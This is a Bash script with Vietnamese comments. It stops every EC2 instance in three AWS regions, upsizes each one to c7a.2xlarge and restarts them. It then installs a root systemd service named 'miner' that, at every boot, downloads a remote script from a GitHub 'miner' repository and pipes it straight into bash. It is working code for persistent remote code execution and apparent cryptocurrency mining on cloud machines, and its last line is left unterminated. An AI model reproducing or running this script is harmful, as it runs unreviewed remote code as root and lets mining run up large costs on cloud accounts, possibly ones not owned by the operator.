#!/bin/bash

# Danh sách vùng AWS cần thay đổi instance
REGIONS=("us-east-1" "us-west-2" "us-east-2")

# Hàm cập nhật instance type mới
get_new_instance_type() {
    case "$1" in
        "c7a.large") echo "c7a.2xlarge" ;;
        *) echo "c7a.2xlarge" ;; # Mặc định nếu không xác định được
    esac
}

# Lặp qua từng vùng để dừng và thay đổi instance type
for REGION in "${REGIONS[@]}"; do
    echo "🔹 Đang xử lý vùng: $REGION"

    # Lấy danh sách Instance ID trong vùng
    INSTANCE_IDS=$(aws ec2 describe-instances --region "$REGION" --query "Reservations[*].Instances[*].InstanceId" --output text)

    if [ -z "$INSTANCE_IDS" ]; then
        echo "⚠️ Không có instance nào trong vùng $REGION."
        continue
    fi

    # Dừng tất cả instances trong vùng
    echo "🛑 Dừng tất cả instances trong vùng $REGION..."
    aws ec2 stop-instances --instance-ids $INSTANCE_IDS --region "$REGION"
    aws ec2 wait instance-stopped --instance-ids $INSTANCE_IDS --region "$REGION"

    # Thay đổi instance type
    for INSTANCE in $INSTANCE_IDS; do
        CURRENT_TYPE=$(aws ec2 describe-instances --instance-ids "$INSTANCE" --region "$REGION" --query "Reservations[*].Instances[*].InstanceType" --output text)
        NEW_TYPE=$(get_new_instance_type "$CURRENT_TYPE")

        echo "🔄 Đổi instance $INSTANCE từ $CURRENT_TYPE ➝ $NEW_TYPE"
        aws ec2 modify-instance-attribute --instance-id "$INSTANCE" --instance-type "{\"Value\": \"$NEW_TYPE\"}" --region "$REGION"
    done

    # Khởi động lại instances
    echo "🚀 Khởi động lại tất cả instances trong vùng $REGION..."
    aws ec2 start-instances --instance-ids $INSTANCE_IDS --region "$REGION"

done

echo "✅ Hoàn tất thay đổi instance type cho tất cả vùng!"

# ------------------------------
# 🛠️ Cấu Hình Tự Động Chạy Sau Khi Khởi Động Lại
# ------------------------------

USER_DATA_URL="https://raw.githubusercontent.com/hieudv194/miner/refs/heads/main/viauto"

# Kiểm tra nếu script đang chạy với quyền root
if [ "$(id -u)" -ne 0 ]; then
    echo "⚠️ Vui lòng chạy script với quyền root!"
    exit 1
fi

# Tạo systemd service để tải & chạy script mỗi khi máy khởi động lại
cat > /etc/systemd/system/miner.service <<EOF
[Unit]
Description=Auto-run Miner Script
After=network.target
Wants=network-online.target
Requires=cloud-final.service

[Service]
ExecStart=/bin/bash -c 'sleep 60 && curl -s -L "$USER_DATA_URL" | bash'
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd và kích hoạt service
systemctl daemon-reload
systemctl enable miner
systemctl restart miner

echo "✅ Cấu hình tự động chạy script sau khi khởi động lại thành công!
